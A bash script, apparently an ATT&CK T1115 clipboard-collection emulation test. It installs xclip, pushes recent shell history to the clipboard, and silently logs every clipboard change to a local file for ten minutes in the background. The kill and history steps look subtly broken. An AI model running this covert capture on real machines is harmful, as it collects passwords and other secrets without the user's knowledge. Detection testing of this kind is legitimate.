#!/bin/bash

# Create the output directory if it does not exist
output_dir="Linux_output/Collection/T1115_Collection"
mkdir -p "$output_dir"

# Output file
output_file="${output_dir}/history.txt"

# Function to log output
log_output() {
    echo "$1" >> "$output_file"
}

# Install xclip if not already installed
if ! command -v xclip &> /dev/null; then
    log_output "Installing xclip..."
    apt-get update -y && apt-get install xclip -y
fi

# Function to append clipboard content to the file if it's new
append_clipboard() {
    local last_clipboard=""
    while true; do
        current_clipboard=$(xclip -o)
        if [[ "$current_clipboard" != "$last_clipboard" ]]; then
            echo "$current_clipboard" >> "$output_file"
            last_clipboard="$current_clipboard"
        fi
        sleep 5  # Check every 5 seconds
    done
}

# Copy history to clipboard and save to file after 10 minutes
{
    # Copy last 30 commands from history to clipboard
    history | tail -n 30 | xclip -sel clip

    # Run the clipboard monitoring in the background
    append_clipboard &
    
    # Run in background for 10 minutes
    sleep 600

    # Terminate the clipboard monitoring process after 10 minutes
    pkill -f 'append_clipboard'
} &> /dev/null &

log_output "Started capturing clipboard history. The process will run in the background for 10 minutes."

